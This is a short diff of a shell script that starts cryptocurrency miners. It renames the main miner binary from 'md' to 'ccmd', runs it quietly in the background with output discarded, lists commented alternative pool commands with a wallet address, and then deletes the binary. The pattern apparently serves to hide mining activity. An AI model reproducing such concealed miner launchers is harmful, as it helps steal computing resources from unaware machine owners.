@@ -35,7 +35,7 @@ PASS=xxx
 #pooler --background --quiet --url stratum+tcp://ltc.give-me-coins.com:3333 --userpass zaos.$NAME:x  > /dev/null 2>&1
 #neis --background --quiet --algo quark --url http://fz2.mine-pool.net:9372 -u FJoZ2U7iu2kTXiJYrH6KDaeVWovefB2PqJ -p xxx  > /dev/null 2>&1
 
-md -qB -a $ALGO -o $URL -u $USER -p $PASS >/dev/null 2>&1
+ccmd -qB -a $ALGO -o $URL -u $USER -p $PASS >/dev/null 2>&1
 
 # clean up
 rm -f $MD
